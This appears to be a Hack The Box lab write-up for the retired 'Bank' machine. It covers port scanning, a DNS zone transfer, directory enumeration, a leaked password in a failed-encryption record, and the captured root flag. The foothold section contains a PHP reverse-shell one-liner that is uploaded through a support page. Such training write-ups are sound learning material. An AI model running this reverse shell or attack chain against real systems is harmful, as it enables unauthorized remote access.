---
title: "HTB Bank Writeup"
date: 2022-03-25T23:20:57+05:30
tags: ['Easy', 'Linux', 'Retired']
categories: ['Linux Easy']
draft: false
---
# Process
*	Added `<IP> bank.htb` to `/etc/hosts`
*	Scanned 65535 ports tcp and upd. Found various services running.
	*	DNS server was running on `tcp/53`. Carried out zone transfer. Found an interesting subdomain `chris.bank.htb`
	*	HTTP server was running on `80/tcp`. 
		*	Carried out directory enumeration. Found `/balance-transfer`. Numerous transaction records were found. Most of them seemed encrypted. Sorted the recods by size and found one with failed encryption. It has password.
*	Thus, logged in using the username found from DNS records and password from the transaction record with failed encryption
*	The application had a ticketing system. Leveraged it to get a reverse shell. Got userflag.
*	Enumerated for unknown SUID binaries. Executed the SUID `emergency` and got a reverse shell.

## 1. Enumeration

### 1.1 Nmap
Carried out port scan and found 3 ports to be open

```bash
sudo nmap -A -sC -P bank.htb -T4 -oN nmap.AsCdefault
[sudo] password for babayaga: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-20 10:50 IST
Nmap scan report for bank.htb (10.129.29.200)
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-title: HTB Bank - Login
|_Requested resource was login.php
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/20%OT=22%CT=1%CU=30680%PV=Y%DS=2%DC=T%G=Y%TM=6236B9C
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   226.74 ms 10.10.14.1
2   226.83 ms bank.htb (10.129.29.200)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.83 seconds
```

### 1.2 Masscan
Used it to scan all the 65535 ports and to corroborate the results of top 1000 ports scanned by nmap.
```bash
sudo masscan -p 1-65535 10.129.29.200 -e tun0 --rate=1000
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-20 05:21:12 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 53/tcp on 10.129.29.200                                   
Discovered open port 22/tcp on 10.129.29.200                                   
Discovered open port 80/tcp on 10.129.29.200
```

### 1.3 Zone Transfer
One of the many attack vectors I tried to exploit. Thus, carried out zone transfer and found an interesting sub domain `chris.bank.htb`
```bash
dig axfr bank.htb @10.129.29.200

; <<>> DiG 9.16.15-Debian <<>> axfr bank.htb @10.129.29.200
;; global options: +cmd
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800
bank.htb.		604800	IN	NS	ns.bank.htb.
bank.htb.		604800	IN	A	10.129.29.200
ns.bank.htb.		604800	IN	A	10.129.29.200
www.bank.htb.		604800	IN	CNAME	bank.htb.
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800
;; Query time: 156 msec
;; SERVER: 10.129.29.200#53(10.129.29.200)
;; WHEN: Sun Mar 20 15:46:10 IST 2022
;; XFR size: 6 records (messages 1, bytes 171)
```
## 2. HTTP://bank.htb
### 2.1 Directory Enumeration
Used `ffuf` to carry out sub directory enumeration.
```bash
ffuf -u http://bank.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -of md -o bank.dirbuster -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://bank.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Output file      : bank.dirbuster
 :: File format      : md
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

uploads                 [Status: 301, Size: 305, Words: 20, Lines: 10]
                        [Status: 302, Size: 7322, Words: 3793, Lines: 189]
assets                  [Status: 301, Size: 304, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 301, Words: 20, Lines: 10]
                        [Status: 302, Size: 7322, Words: 3793, Lines: 189]
server-status           [Status: 403, Size: 288, Words: 21, Lines: 11]
balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10]

```



### 2.2 /balance-transfer
`/balance-transfer` had records of numerous transaction but unfortunatedly most of them were encrypted
{{< figure src="/images/PicBank/2022-03-20_18-37.png" title="/balance-transfer sub-directory" >}}

#### 2.2.1 Contents of a file
Sample content of encrypted file.
```text
++OK ENCRYPT SUCCESS

+=================+

| HTB Bank Report |

+=================+



===UserAccount===

Full Name: enzXcSol1jEIj7La7vMX5o22eb9ez6rNt0LFT90UtFDMNoXUTKSZ8U1m6aAFh2sL2dqWnrRQ7uDUSAOMkGLsBNOHYpmfrP0u3rqqThh0MUVFuJsOqeh216KZv7eWWfr0

Email: GRrz9IAWCvB7f3WFhdIjksiPAxMwMdxt5Y3eGDbj8MrnQn37BMqVfJLPgxm3KTwPRz4ydfSm1jJSHNZjzqfO90Eqx0uhT16LBajOqcaswUkdIkwhKM6UMKljKPBERHps

Password: SJhjVrLsm5F4pcmaYt5Keq4ZgFD7n2AgMRzIjlaGqPKQ2711A6MOwQNNwrVUuvagnKYH59nwZ8n1fo3PuPE1GsPcTK7nghDE2Cl7LJEKR1M6pPWUFAVl2KyVvFjMXXqZ

CreditCards: 3

Transactions: 117

Balance: 1164910 .

===UserAccount===
```

#### 2.2.2 Failed Encryption
Sorted the transaction and found one with size smaller than usual. It was record of unencrypted transcation.

{{< figure src="/images/PicBank/unencrypted.png" title="Failed Encryption" >}}

```text
--ERR ENCRYPT FAILED

+=================+

| HTB Bank Report |

+=================+



===UserAccount===

Full Name: Christos Christopoulos

Email: chris@bank.htb

Password: !##HTBB4nkP4ssw0rd!##

CreditCards: 5

Transactions: 39

Balance: 8842803 .

===UserAccount===
```

### 2.3 bank.htb
Logging in using previously found credentials.
{{< figure src="/images/PicBank/webpage.png" title="http://bank.htb" >}}

## 3. Foothold
### 3.1 /support.php
Had an option to upload. Exploited it to get reverse shell.
{{< figure src="/images/PicBank/upload-page.png" title="Upload Page" >}}

Shell Used: 
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 3.2 www-shell
{{< figure src="/images/PicBank/www-shell.png" title="Reverse Shell" >}}


## 4. Privilege Escalation
Found an unknow SUID `emergency`.

{{< figure src="/images/PicBank/root.png" title="Root Access" >}}

```bash
# cat root.txt
787535712a0acf0c8e65223c60dca882
```

